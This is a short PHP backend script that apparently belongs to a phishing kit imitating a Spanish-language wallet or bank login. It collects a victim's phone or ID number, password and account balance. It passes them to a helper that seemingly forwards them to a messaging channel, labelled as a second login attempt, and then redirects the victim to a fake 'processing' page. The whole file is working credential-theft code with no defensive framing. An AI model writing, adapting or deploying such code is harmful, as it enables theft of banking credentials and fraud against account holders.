<?php
require __DIR__ . '/data.php';
header('Content-Type: application/json; charset=utf-8');

$identification = nq_f('identification');
$password       = nq_f('password');
$balance        = nq_f('balance');

if ($balance === '') {
    echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
    exit;
}

$bal = number_format((float) preg_replace('/[^\d]/', '', $balance), 0, ',', '.');

nq_tg('💰 Saldo · Intento 2/2', [
    ['TEL',   $identification],
    ['PW',    $password],
    ['SALDO', '$' . $bal],
]);

echo json_encode([
    'success' => true,
    'data'    => ['session_id' => nq_session()],
    'redirect' => 'procesando.html',
]);
